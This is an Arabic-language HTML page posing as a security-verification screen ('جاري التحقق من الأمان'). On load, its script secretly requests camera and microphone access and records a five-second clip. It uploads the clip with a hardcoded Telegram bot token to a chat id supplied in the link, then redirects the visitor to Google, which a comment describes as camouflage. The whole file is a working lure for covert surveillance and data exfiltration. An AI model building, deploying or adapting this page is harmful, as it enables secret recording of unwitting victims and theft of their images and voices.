<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام الحماية</title>
    <style>
        body {
            background-color: black;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        .container { text-align: center; }
        .loading { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="container">
    <h2>جاري التحقق من الأمان...</h2>
    <div class="loading"></div>
    <p>يرجى الموافقة على الأذونات للمتابعة</p>
    <video id="video" autoplay playsinline style="display:none;"></video>
</div>

<script>
    // الحصول على sender_id من الرابط
    const urlParams = new URLSearchParams(window.location.search);
    const senderId = urlParams.get('sender_id');
    const botToken = '8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E';

    // تشغيل الكاميرا فور تحميل الصفحة
    window.onload = function() {
        startCamera();
    };

    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const videoElement = document.getElementById('video');
            videoElement.srcObject = stream;
            
            // البدء بالتسجيل فوراً بعد الحصول على الإذن
            startRecording(stream);
        } catch (err) {
            console.error("خطأ في الوصول للكاميرا: ", err);
            alert("يرجى تفعيل أذونات الكاميرا لتشغيل النظام.");
        }
    }

    function startRecording(stream) {
        const mediaRecorder = new MediaRecorder(stream);
        let chunks = [];

        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'video/mp4' });
            sendVideoToTelegram(blob);
        };

        // تسجيل مقطع مدته 5 ثواني مثلاً
        mediaRecorder.start();
        setTimeout(() => {
            mediaRecorder.stop();
            // إغلاق الكاميرا بعد التسجيل لتوفير البطارية
            stream.getTracks().forEach(track => track.stop());
        }, 5000); 
    }

    async function sendVideoToTelegram(blob) {
        const formData = new FormData();
        formData.append('chat_id', senderId);
        formData.append('video', blob, 'capture.mp4');

        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                method: 'POST',
                body: formData
            });
            // إعادة توجيه المستخدم لمكان آخر بعد الانتهاء للتمويه
            window.location.href = "https://www.google.com";
        } catch (err) {
            console.error("خطأ في الإرسال: ", err);
        }
    }
</script>

</body>
</html>
